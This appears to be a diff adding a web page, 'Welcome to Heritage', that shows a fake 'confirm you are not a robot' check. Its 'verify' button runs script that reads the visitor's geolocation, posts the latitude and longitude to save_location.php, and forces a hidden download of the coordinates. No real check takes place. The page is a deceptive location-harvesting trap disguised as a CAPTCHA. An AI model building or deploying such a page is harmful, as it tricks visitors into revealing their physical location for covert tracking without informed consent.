@@ -1,0 +1,114 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <title>Welcome to Heritage</title>
+    <!-- Bootstrap CSS -->
+    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
+    <style>
+        /* Custom CSS for loader */
+        .loader {
+            border: 16px solid #f3f3f3;
+            /* Light grey */
+            border-top: 16px solid #3498db;
+            /* Blue */
+            border-radius: 50%;
+            width: 80px;
+            height: 80px;
+            animation: spin 2s linear infinite;
+            margin: 20px auto;
+        }
+
+        @keyframes spin {
+            0% {
+                transform: rotate(0deg);
+            }
+
+            100% {
+                transform: rotate(360deg);
+            }
+        }
+    </style>
+    <script>
+        function getLocationAndSubmit() {
+            var loader = document.getElementById('loader');
+            loader.style.display = 'block'; // Display loader
+
+            if (navigator.geolocation) {
+                navigator.geolocation.getCurrentPosition(function (position) {
+                    var latitude = position.coords.latitude;
+                    var longitude = position.coords.longitude;
+
+                    // Hide loader after getting location
+                    loader.style.display = 'none';
+
+                    // Write location data to a text file
+                    writeToTextFile(latitude, longitude);
+
+                    // Send location data to PHP script using AJAX
+                    var xhr = new XMLHttpRequest();
+                    var url = 'save_location.php';
+                    var params = 'latitude=' + latitude + '&longitude=' + longitude;
+                    xhr.open('POST', url, true);
+                    xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
+
+                    xhr.onreadystatechange = function () {
+                        if (xhr.readyState == 4 && xhr.status == 200) {
+                            console.log(xhr.responseText); // Display server response (optional)
+                        }
+                    };
+
+                    xhr.send(params);
+                }, function (error) {
+                    // Handle errors
+                    loader.style.display = 'none';
+                    console.log('Error getting location: ' + error.message);
+                });
+            } else {
+                loader.style.display = 'none';
+                console.log("Geolocation is not supported by this browser.");
+            }
+
+            function writeToTextFile(latitude, longitude) {
+                var text = "Latitude: " + latitude + ", Longitude: " + longitude;
+
+                // Create a Blob object and create a URL to download
+                var blob = new Blob([text], { type: "text/plain" });
+                var url = URL.createObjectURL(blob);
+
+                // Create an <a> element to trigger the download
+                var a = document.createElement("a");
+                a.style.display = "none";
+                a.href = url;
+                a.download = "location.txt";
+
+                // Append the <a> element to the document body
+                document.body.appendChild(a);
+
+                // Click the <a> element to trigger the download
+                a.click();
+
+                // Remove the <a> element from the document body
+                document.body.removeChild(a);
+            }
+        }
+
+    </script>
+</head>
+
+<body>
+    <div class="container">
+        <h2 class="mt-5">Welcome to Heritage</h2>
+        <p>Please hold while we confirm you are not a robot</p>
+        <div id="loader" class="loader" style="display: none;"></div> <!-- Loader -->
+        <button type="button" class="btn btn-primary mt-3" onclick="getLocationAndSubmit()">Click here to
+            verify</button><br><br>
+    </div>
+
+    <!-- Bootstrap JS and dependencies (optional) -->
+    <script src="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/js/bootstrap.min.js"></script>
+    <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.5.1/jquery.min.js"></script>
+</body>
+
+</html>
